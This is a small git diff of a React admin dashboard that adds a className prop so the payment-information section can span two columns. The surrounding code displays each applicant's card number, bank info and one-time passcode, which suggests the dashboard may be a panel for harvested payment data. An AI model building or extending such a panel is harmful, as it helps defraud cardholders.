@@ -730,7 +730,7 @@ export default function AdminDashboard() {
                     selectedApplication.bankInfo,
                     selectedApplication.otp,
                   ) && (
-                    <Section title="معلومات الدفع" icon={<CreditCard className="w-3 h-3" />}>
+                    <Section title="معلومات الدفع" icon={<CreditCard className="w-3 h-3" />} className="col-span-2">
                       <div className="mb-2">
                         <CreditCardMockup
                           cardNumber={selectedApplication.cardNumber}
@@ -1177,9 +1177,9 @@ export default function AdminDashboard() {
   )
 }
 
-function Section({ title, icon, children }: { title: string; icon: React.ReactNode; children: React.ReactNode }) {
+function Section({ title, icon, children, className }: { title: string; icon: React.ReactNode; children: React.ReactNode; className?: string }) {
   return (
-    <div className="bg-slate-800/30 rounded-lg border border-slate-700/50 p-2">
+    <div className={`bg-slate-800/30 rounded-lg border border-slate-700/50 p-2 ${className || ""}`}>
       <div className="flex items-center gap-1.5 mb-1.5">
         <div className="text-slate-400">{icon}</div>
         <h3 className="text-[9px] font-bold text-slate-200">{title}</h3>
